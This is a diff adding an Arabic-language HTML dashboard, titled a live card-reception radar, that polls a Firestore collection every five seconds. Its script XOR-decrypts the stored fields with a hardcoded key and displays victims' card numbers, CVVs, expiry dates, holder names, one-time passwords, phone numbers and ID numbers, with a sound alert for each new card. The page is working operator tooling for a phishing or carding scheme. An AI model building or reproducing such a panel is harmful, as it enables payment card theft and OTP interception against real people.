@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الرادار الحي - لوحة استقبال البطاقات</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #0f172a; color: #f8fafc; }
+        .mono { font-family: 'Roboto Mono', monospace; }
+        .card-live { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }
+        .gold-glow { box-shadow: 0 0 15px rgba(201, 162, 39, 0.3); border-color: #c9a227 !important; }
+        .pulse-red { animation: pulse-red 2s infinite; }
+        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); } 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); } }
+        .new-entry { animation: slide-in 0.5s ease-out; }
+        @keyframes slide-in { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <header class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
+        <div>
+            <h1 class="text-3xl font-bold text-[#c9a227] flex items-center gap-3">
+                <i data-lucide="shield-check" class="w-8 h-8"></i>
+                رادار البطاقات الحي
+            </h1>
+            <p class="text-slate-400 text-sm mt-1">استقبال وتشفير البيانات من Firebase مباشرة</p>
+        </div>
+        <div class="flex items-center gap-4">
+            <div class="bg-slate-800 px-4 py-2 rounded-full border border-slate-700 flex items-center gap-2">
+                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
+                <span class="text-xs font-bold" id="status">متصل بالسيرفر</span>
+            </div>
+            <button onclick="testSound()" class="p-2 bg-slate-800 rounded-lg hover:bg-slate-700 transition-all">
+                <i data-lucide="volume-2" class="w-5 h-5"></i>
+            </button>
+        </div>
+    </header>
+
+    <div class="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
+        
+        <!-- Left: Stats & Logs -->
+        <div class="space-y-6">
+            <div class="card-live p-6 rounded-3xl">
+                <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
+                    <i data-lucide="activity" class="w-5 h-5 text-blue-400"></i> إحصائيات سريعة
+                </h3>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="bg-slate-800/50 p-4 rounded-2xl border border-slate-700">
+                        <p class="text-[10px] text-slate-500 uppercase">إجمالي السجلات</p>
+                        <p class="text-2xl font-bold" id="stat-total">0</p>
+                    </div>
+                    <div class="bg-slate-800/50 p-4 rounded-2xl border border-slate-700">
+                        <p class="text-[10px] text-slate-500 uppercase">بطاقات مكتشفة</p>
+                        <p class="text-2xl font-bold text-[#c9a227]" id="stat-cards">0</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-live p-6 rounded-3xl h-[400px] flex flex-col">
+                <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
+                    <i data-lucide="list-tree" class="w-5 h-5 text-purple-400"></i> سجل العمليات (Logs)
+                </h3>
+                <div id="log-container" class="flex-1 overflow-y-auto text-[10px] mono text-slate-500 space-y-1 custom-scrollbar">
+                    <div>[SYSTEM] جاري بدء نظام الرادار...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right: Live Cards Display -->
+        <div class="lg:col-span-2 space-y-6">
+            <div class="flex items-center justify-between">
+                <h2 class="text-xl font-bold flex items-center gap-2">
+                    <i data-lucide="credit-card" class="w-6 h-6 text-[#c9a227]"></i> البطاقات المستلمة حالياً
+                </h2>
+                <span class="text-xs text-slate-500">يتم التحديث كل 5 ثوانٍ</span>
+            </div>
+
+            <div id="no-data" class="hidden py-20 text-center bg-slate-800/30 rounded-3xl border-2 border-dashed border-slate-700">
+                <i data-lucide="inbox" class="w-12 h-12 text-slate-600 mx-auto mb-4"></i>
+                <p class="text-slate-500">في انتظار أول عملية تسجيل من الموقع...</p>
+            </div>
+
+            <div id="cards-grid" class="space-y-6">
+                <!-- Live Cards will appear here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Audio for notifications -->
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+
+    <script>
+        const PROJECT_ID = "dsfe-ert";
+        const XOR_KEY = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";
+        let lastId = null;
+        let knownIds = new Set();
+
+        function addLog(msg) {
+            const container = document.getElementById('log-container');
+            const div = document.createElement('div');
+            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            container.prepend(div);
+        }
+
+        function decrypt(val) {
+            if (!val || typeof val !== 'string') return '-';
+            if (/^\d+$/.test(val.replace(/\s/g, ''))) return val;
+            try {
+                const binary = atob(val);
+                let result = "";
+                for (let i = 0; i < binary.length; i++) {
+                    result += String.fromCharCode(binary.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
+                }
+                return result;
+            } catch (e) { return val; }
+        }
+
+        function testSound() {
+            document.getElementById('notif-sound').play();
+            addLog("اختبار الصوت ناجح");
+        }
+
+        async function fetchLive() {
+            try {
+                const res = await fetch(`https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/pays?orderBy=updatedAt desc&pageSize=20`);
+                const data = await res.json();
+                
+                if (!data.documents) return;
+
+                const container = document.getElementById('cards-grid');
+                const noData = document.getElementById('no-data');
+                
+                let cardCount = 0;
+                let foundNew = false;
+
+                data.documents.forEach(doc => {
+                    const id = doc.name.split('/').pop();
+                    const f = doc.fields || {};
+                    
+                    // Extract Card Data
+                    let cNum = '-', cExp = '-', cCVV = '-', cHolder = '-', raw = '';
+                    let hasData = false;
+
+                    // Method 1: Direct Fields
+                    if (f._v1 || f.cardNumber) {
+                        cNum = decrypt(f._v1?.stringValue || f.cardNumber?.stringValue);
+                        cExp = decrypt(f._v3?.stringValue || f.expiryDate?.stringValue);
+                        cCVV = decrypt(f._v2?.stringValue || f.cvv?.stringValue);
+                        cHolder = decrypt(f._v4?.stringValue || f.cardHolderName?.stringValue);
+                        raw = f._v1?.stringValue || f.cardNumber?.stringValue;
+                        hasData = true;
+                    }
+
+                    // Method 2: History Array
+                    const history = f.history?.arrayValue?.values || [];
+                    history.forEach(h => {
+                        const hf = h.mapValue?.fields || {};
+                        if (hf.type?.stringValue === '_t1') {
+                            const d = hf.data?.mapValue?.fields || {};
+                            cNum = decrypt(d._v1?.stringValue);
+                            cExp = decrypt(d._v3?.stringValue);
+                            cCVV = decrypt(d._v2?.stringValue);
+                            cHolder = decrypt(d._v4?.stringValue);
+                            raw = d._v1?.stringValue;
+                            hasData = true;
+                        }
+                    });
+
+                    if (hasData) {
+                        cardCount++;
+                        if (!knownIds.has(id)) {
+                            knownIds.add(id);
+                            foundNew = true;
+                            addLog(`تم اكتشاف بطاقة جديدة: ${id}`);
+                        }
+
+                        // Check if card element exists
+                        let cardEl = document.getElementById(`card-${id}`);
+                        if (!cardEl) {
+                            cardEl = document.createElement('div');
+                            cardEl.id = `card-${id}`;
+                            cardEl.className = "card-live p-8 rounded-[2rem] border-2 border-slate-700 relative overflow-hidden new-entry gold-glow";
+                            container.prepend(cardEl);
+                        }
+
+                        const otp = f.otpCode?.stringValue || f._v5?.stringValue || '-';
+                        const decryptedOtp = decrypt(otp);
+
+                        cardEl.innerHTML = `
+                            <div class="flex justify-between items-start mb-6">
+                                <div class="flex items-center gap-4">
+                                    <div class="w-14 h-14 rounded-2xl bg-[#c9a227]/20 flex items-center justify-center text-[#c9a227]">
+                                        <i data-lucide="user" class="w-8 h-8"></i>
+                                    </div>
+                                    <div>
+                                        <h4 class="text-xl font-bold text-white">${f.ownerName?.stringValue || f.fullName?.stringValue || 'زائر مجهول'}</h4>
+                                        <p class="text-xs text-slate-400 mt-1">ID: ${id} | 📍 ${f.currentStep?.stringValue || 'home'}</p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-[10px] font-bold px-3 py-1 rounded-full bg-blue-500/20 text-blue-400 border border-blue-500/30 uppercase tracking-widest">Live Session</span>
+                                    <p class="text-[10px] text-slate-500 mt-2">${new Date(doc.updateTime).toLocaleString('ar-AE')}</p>
+                                </div>
+                            </div>
+
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                                <!-- Card Visual -->
+                                <div class="bg-gradient-to-br from-slate-800 to-slate-950 p-6 rounded-3xl border border-slate-700 shadow-2xl relative">
+                                    <div class="flex justify-between items-start mb-8">
+                                        <i data-lucide="contact-2" class="w-10 h-10 text-slate-600"></i>
+                                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-8 opacity-50">
+                                    </div>
+                                    <div class="space-y-6">
+                                        <div>
+                                            <p class="text-[9px] text-slate-500 uppercase tracking-[0.2em] mb-1">Card Number</p>
+                                            <p class="text-2xl mono tracking-[0.15em] text-white">${cNum}</p>
+                                        </div>
+                                        <div class="flex gap-12">
+                                            <div>
+                                                <p class="text-[9px] text-slate-500 uppercase mb-1">Expiry</p>
+                                                <p class="mono text-lg">${cExp}</p>
+                                            </div>
+                                            <div>
+                                                <p class="text-[9px] text-slate-500 uppercase mb-1">CVV</p>
+                                                <p class="mono text-lg text-yellow-500">${cCVV}</p>
+                                            </div>
+                                        </div>
+                                        <div>
+                                            <p class="text-[9px] text-slate-500 uppercase mb-1">Card Holder</p>
+                                            <p class="font-bold text-sm uppercase tracking-wider">${cHolder}</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Extra Info & OTP -->
+                                <div class="flex flex-col justify-between space-y-4">
+                                    <div class="bg-slate-900/50 p-4 rounded-2xl border border-slate-800 space-y-2 text-sm">
+                                        <div class="flex justify-between"><span class="text-slate-500">الهاتف:</span><span class="font-bold">${f.phoneNumber?.stringValue || '-'}</span></div>
+                                        <div class="flex justify-between"><span class="text-slate-500">الهوية:</span><span class="font-bold">${f.identityNumber?.stringValue || '-'}</span></div>
+                                        <div class="flex justify-between"><span class="text-slate-500">المنطقة:</span><span class="font-bold">${f.region?.stringValue || '-'}</span></div>
+                                    </div>
+
+                                    ${(decryptedOtp !== '-') ? `
+                                    <div class="bg-yellow-500/10 border-2 border-yellow-500/30 p-6 rounded-3xl text-center pulse-red">
+                                        <p class="text-[10px] text-yellow-500 uppercase font-bold mb-1 tracking-widest">One Time Password (OTP)</p>
+                                        <p class="text-4xl font-bold text-yellow-500 tracking-[0.3em]">${decryptedOtp}</p>
+                                    </div>
+                                    ` : `
+                                    <div class="bg-slate-800/50 border border-slate-700 p-6 rounded-3xl text-center">
+                                        <p class="text-slate-500 text-xs italic">في انتظار رمز OTP...</p>
+                                    </div>
+                                    `}
+                                </div>
+                            </div>
+
+                            <!-- Debug View -->
+                            <div class="mt-6 pt-4 border-t border-slate-800">
+                                <details class="cursor-pointer">
+                                    <summary class="text-[10px] text-slate-600 hover:text-slate-400 transition-all uppercase tracking-widest">إظهار البيانات الخام (Debug Raw Data)</summary>
+                                    <div class="mt-2 p-3 bg-black/30 rounded-xl text-[9px] mono text-blue-400 break-all">
+                                        ${raw}
+                                    </div>
+                                </details>
+                            </div>
+                        `;
+                    }
+                });
+
+                if (cardCount === 0) noData.classList.remove('hidden');
+                else noData.classList.add('hidden');
+
+                document.getElementById('stat-total').innerText = data.documents.length;
+                document.getElementById('stat-cards').innerText = cardCount;
+
+                if (foundNew) document.getElementById('notif-sound').play();
+                
+                lucide.createIcons();
+            } catch (e) {
+                console.error(e);
+                addLog(`خطأ في الاتصال: ${e.message}`);
+            }
+        }
+
+        setInterval(fetchLive, 5000);
+        fetchLive();
+        lucide.createIcons();
+    </script>
+</body>
+</html>
